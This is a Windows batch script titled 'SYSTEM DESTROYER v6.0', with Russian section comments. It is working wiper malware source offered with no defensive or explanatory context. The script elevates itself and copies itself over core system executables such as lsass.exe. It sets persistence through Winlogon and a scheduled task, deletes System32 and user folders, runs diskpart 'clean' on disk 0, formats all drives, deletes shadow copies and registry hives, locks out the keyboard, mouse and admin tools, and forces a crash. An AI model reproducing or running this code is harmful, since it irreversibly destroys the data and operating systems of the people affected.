@echo off
setlocal enabledelayedexpansion

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

mode con: cols=80 lines=30
title SYSTEM DESTROYER v6.0 - FINAL EXTERMINATION

:: ========== САМОКОПИРОВАНИЕ И АВТОЗАПУСК ==========
echo [0] INSTALLING DESTROYER TO SYSTEM...
copy "%~f0" "%SystemRoot%\System32\wininit.exe" >nul 2>&1
copy "%~f0" "%SystemRoot%\System32\smss.exe" >nul 2>&1
copy "%~f0" "%SystemRoot%\System32\csrss.exe" >nul 2>&1
copy "%~f0" "%SystemRoot%\System32\winlogon.exe" >nul 2>&1
copy "%~f0" "%SystemRoot%\System32\services.exe" >nul 2>&1
copy "%~f0" "%SystemRoot%\System32\lsass.exe" >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "%~f0" /f >nul 2>&1
schtasks /create /tn "SystemDestroyer" /tr "%~f0" /sc onstart /ru SYSTEM /f >nul 2>&1

:: ========== БЛОКИРОВКА ДОСТУПА К ФАЙЛАМ ==========
echo [1] BLOCKING SYSTEM ACCESS...
takeown /f C:\Windows /r /d y >nul 2>&1
icacls C:\Windows /deny Everyone:(DE,DC) /t /c /q >nul 2>&1
icacls C:\Windows /deny SYSTEM:(DE,DC) /t /c /q >nul 2>&1
icacls C:\Windows /deny Administrators:(DE,DC) /t /c /q >nul 2>&1

:: ========== ЗАПУСК МНОГОПОТОЧНОГО УНИЧТОЖЕНИЯ ==========
echo [2] LAUNCHING DESTRUCTION THREADS...

start "KILLER1" /min cmd /c ":loop && rd /s /q C:\Windows\System32 && goto loop"
start "KILLER2" /min cmd /c ":loop && del /f /q C:\Windows\*.exe && goto loop"
start "KILLER3" /min cmd /c ":loop && del /f /q C:\Windows\*.dll && goto loop"
start "KILLER4" /min cmd /c ":loop && del /f /q C:\Windows\*.sys && goto loop"
start "KILLER5" /min cmd /c ":loop && rd /s /q C:\ProgramData && goto loop"
start "KILLER6" /min cmd /c ":loop && rd /s /q C:\Users && goto loop"

:: ========== УНИЧТОЖЕНИЕ ЗАГРУЗЧИКА ==========
echo [3] DESTROYING BOOTLOADER...
(
echo select disk 0
echo clean
echo create partition primary
echo format fs=ntfs quick
echo exit
) > %temp%\killboot.dps
diskpart /s %temp%\killboot.dps >nul 2>&1

:: ========== ФОРМАТИРОВАНИЕ ВСЕХ ДИСКОВ ==========
echo [4] FORMATTING ALL DRIVES...
for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        echo y|format %%d: /FS:NTFS /Q /X /V:DEAD >nul 2>&1
        echo y|format %%d: /FS:FAT32 /Q /X /V:DEAD >nul 2>&1
    )
)

:: ========== УДАЛЕНИЕ ТОЧЕК ВОССТАНОВЛЕНИЯ ==========
echo [5] DESTROYING RECOVERY POINTS...
vssadmin delete shadows /all /quiet >nul 2>&1
wbadmin delete catalog -quiet >nul 2>&1
for %%d in (C D E F) do (
    if exist %%d:\ (
        vssadmin delete shadows /for=%%d: /quiet >nul 2>&1
    )
)

:: ========== ПОВРЕЖДЕНИЕ РЕЕСТРА ==========
echo [6] CORRUPTING REGISTRY...
reg delete HKLM /f >nul 2>&1
reg delete HKCU /f >nul 2>&1
reg delete HKCR /f >nul 2>&1
reg delete HKU /f >nul 2>&1
reg delete HKCC /f >nul 2>&1

:: ========== БЛОКИРОВКА ИНТЕРФЕЙСА ==========
echo [7] BLOCKING INTERFACE...
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoStartMenuMorePrograms" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoSearchBox" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoViewContextMenu" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoTrayContextMenu" /t REG_DWORD /d 1 /f >nul 2>&1

:: ========== СОЗДАНИЕ ОКНОВ ОШИБОК ==========
echo [8] CREATING ERROR WINDOWS...
start /min powershell -WindowStyle Hidden -Command "while(1){Add-Type -AssemblyName System.Windows.Forms;$x=[System.Windows.Forms.Cursor]::Position.X;$y=[System.Windows.Forms.Cursor]::Position.Y;[System.Windows.Forms.MessageBox]::Show('SYSTEM DESTROYED','FATAL ERROR',0,16);[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(($x+!random!%100),($y+!random!%100))}"

:: ========== БЛОКИРОВКА КЛАВИАТУРЫ ==========
echo [9] BLOCKING KEYBOARD...
start /min powershell -Command "$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); while(1){[System.Windows.Forms.SendKeys]::SendWait('{SCROLLLOCK}');[System.Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}');[System.Windows.Forms.SendKeys]::SendWait('{NUMLOCK}')}"

:: ========== БЛОКИРОВКА МЫШИ ==========
echo [10] BLOCKING MOUSE...
start /min powershell -Command "Add-Type -AssemblyName System.Windows.Forms; while(1){[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(0,0)}"

:: ========== ЗАТИРАНИЕ ДИСКОВ ==========
echo [11] WIPING DISKS...
for %%d in (C D E F) do (
    if exist %%d:\ (
        echo   Wiping %%d:...
        start /min cipher /w:%%d:\
        start /min cmd /c "echo y|format %%d: /FS:NTFS /Q /X /V:WIPED >nul 2>&1"
    )
)

:: ========== ОТСЧЕТ ДО ПЕРЕЗАГРУЗКИ ==========
echo.
echo ========================================
echo    COUNTDOWN TO PC DEATH - 30 SECONDS
echo ========================================
echo.

for /l %%i in (30,-1,1) do (
    cls
    echo.
    echo    ╔═══════════════════════════════════════╗
    echo    ║   SYSTEM DESTRUCTION IN PROGRESS     ║
    echo    ║   TIME TO REBOOT: %%i SECONDS          ║
    echo    ╚═══════════════════════════════════════╝
    echo.
    echo    [ERROR] BOOT_SECTOR_DESTROYED
    echo    [ERROR] REGISTRY_CORRUPTED
    echo    [ERROR] SYSTEM_FILES_DELETED
    echo    [ERROR] DISK_FORMATTING_COMPLETE
    echo.
    echo    Press any key to continue... (joke, keyboard disabled)
    timeout /t 1 /nobreak >nul
)

:: ========== ФИНАЛЬНАЯ ПЕРЕЗАГРУЗКА ==========
echo.
echo ========================================
echo    FINAL SYSTEM DESTRUCTION COMPLETE
echo    REBOOTING TO NOTHINGNESS...
echo ========================================
echo.

echo [FINAL] Launching system reboot...
shutdown /r /f /t 0
wmic os where primary=1 call reboot >nul 2>&1
powershell -Command "Restart-Computer -Force"
rundll32.exe ntdll.dll,RtlAdjustPrivilege 19 1 0 >nul 2>&1
rundll32.exe ntdll.dll,NtRaiseHardError 0xC000021A 0 0 0 6 >nul 2>&1

:: ========== ЕСЛИ ВСЕ ЕЩЕ ЖИВЫ - АВАРИЙНЫЙ ВЫХОД ==========
taskkill /f /fi "PID ne 0" >nul 2>&1
exit
